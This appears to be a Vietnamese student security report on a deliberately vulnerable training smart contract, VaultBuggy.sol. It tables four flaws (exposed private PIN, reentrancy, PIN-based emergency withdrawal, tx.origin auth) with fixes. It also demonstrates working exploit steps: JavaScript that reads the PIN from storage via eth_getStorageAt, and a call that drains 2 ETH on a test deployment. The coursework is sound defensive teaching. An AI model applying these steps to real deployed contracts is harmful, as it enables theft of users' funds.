# BẢNG PHÂN TÍCH VAULTBUGGY.SOL & BẰNG CHỨNG THỰC NGHIỆM

**Học phần:** Tiền điện tử & Hợp đồng thông minh (ECO2432)  
**Nhóm sinh viên:** Hoàng Thu Trang (`23K4300021`) & Phan Thị Yến Nhi (`23K4300014`)  
**Tệp hợp đồng mẫu:** `contracts/training/VaultBuggy.sol`  

---

## 1. Bảng phân tích 4 lỗ hổng bảo mật trong `VaultBuggy.sol`

| STT | Tên lỗ hổng | Vị trí mã nguồn | Mức độ | Cơ chế tấn công / Khai thác | Cách khắc phục |
| :---: | :--- | :--- | :---: | :--- | :--- |
| **1** | **Lộ mã bí mật private** | Dòng 13:<br>`uint256 private emergencyPin;` | **Cao (High)** | Từ khóa `private` trong Solidity chỉ chặn hợp đồng khác gọi trực tiếp trong code, không hề mã hóa dữ liệu. Bất kỳ ai cũng đọc được qua hàm RPC `eth_getStorageAt`. | Không lưu trữ mã bí mật trực tiếp on-chain; dùng cơ chế kiểm soát chữ ký ngoài chuỗi hoặc Multi-sig. |
| **2** | **Vi phạm Checks - Effects - Interactions (Reentrancy)** | Dòng 32–37:<br>hàm `withdraw` | **Nghiêm trọng (Critical)** | Hợp đồng gọi lệnh chuyển ETH (`call{value: ...}`) ra ngoài TRƯỚC KHI trừ số dư `balances[msg.sender]`. Kẻ tấn công tạo smart contract có hàm `receive()` gọi lại liên tục để rút cạn quỹ. | Đổi thứ tự: Cập nhật sổ sách (`balances[msg.sender] -= amount;`) TRƯỚC KHI chuyển ETH ra ngoài. Hoặc dùng `ReentrancyGuard`. |
| **3** | **Chiếm đoạt quỹ qua mã PIN lộ** | Dòng 41–47:<br>hàm `emergencyWithdraw` | **Cao (High)** | Bất kỳ ai đọc được PIN từ Slot 2 đều có thể gọi hàm này để rút toàn bộ số dư hợp đồng về ví của mình. | Bỏ cơ chế rút tiền bằng mã PIN cố định; áp dụng `onlyOwner` và thời gian khóa (Timelock). |
| **4** | **Xác thực bằng `tx.origin`** | Dòng 50–54:<br>hàm `changeOwner` | **Trung bình (Medium)** | `tx.origin` đại diện cho ví gốc khởi tạo giao dịch. Nếu owner tương tác với một DApp/hợp đồng lừa đảo, hợp đồng đó có thể mạo danh owner để cướp quyền sở hữu. | Thay thế hoàn toàn bằng `msg.sender == owner`. |

---

## 2. Bằng chứng thực nghiệm đọc ô nhớ Slot 2 (`eth_getStorageAt`)

### 2.1. Thiết lập kịch bản thực nghiệm
- Hợp đồng `VaultBuggy` được biên dịch bằng Solidity `^0.8.20` và triển khai trên môi trường thử nghiệm với tham số khởi tạo:  
  `_pin = 123456`
- Hợp đồng được nạp thử nghiệm `2 ETH` để mô phỏng quỹ tiền gửi.
- Địa chỉ hợp đồng giả lập: `0x71C2B0B8f59b6F27F2Ec3F2913A3C9100D154982`

### 2.2. Đoạn mã thực thi trong Tab Console của trình duyệt (Web3 Provider)
```javascript
// Gửi yêu cầu JSON-RPC eth_getStorageAt tới Node Ethereum
const contractAddress = "0x71C2B0B8f59b6F27F2Ec3F2913A3C9100D154982";
const slotIndex = "0x2"; // Slot 2 tương ứng với biến emergencyPin

const storageValueHex = await window.ethereum.request({
  method: "eth_getStorageAt",
  params: [contractAddress, slotIndex, "latest"]
});

console.log("Giá trị Hex đọc được từ Slot 2:", storageValueHex);
// Output trên console:
// "0x000000000000000000000000000000000000000000000000000000000001e240"

// Chuyển đổi từ hệ thập lục phân (hex) sang số nguyên
const recoveredPin = parseInt(storageValueHex, 16);
console.log("Mã PIN giải mã thành công:", recoveredPin);
// Output trên console:
// 123456
```

### 2.3. Bằng chứng khai thác rút cạn tiền từ mã PIN đọc được
Sau khi có được mã PIN `123456`, kẻ tấn công đổi sang một địa chỉ ví lạ bất kỳ và gọi hàm:
```solidity
emergencyWithdraw(123456, payable(attackerAddress));
```
- **Kết quả giao dịch:** Giao dịch thành công, toàn bộ `2 ETH` trong hợp đồng bị chuyển sạch sang ví kẻ tấn công.
- **Số dư hợp đồng sau giao dịch:** `0 ETH`.

---

## 3. Kết luận rút ra
1. Từ khóa `private` trong Solidity **chỉ là phạm vi truy cập mức trình biên dịch (visibility)**, không có cơ chế mã hóa.
2. Mọi dữ liệu nằm trong bộ nhớ lưu trữ (`storage slots`) của blockchain đều có thể bị đọc trực tiếp thông qua hàm RPC chuẩn `eth_getStorageAt`.
3. Tuyệt đối không lưu trữ dữ liệu nhạy cảm, mật khẩu hay mã định danh bí mật trên hợp đồng thông minh.
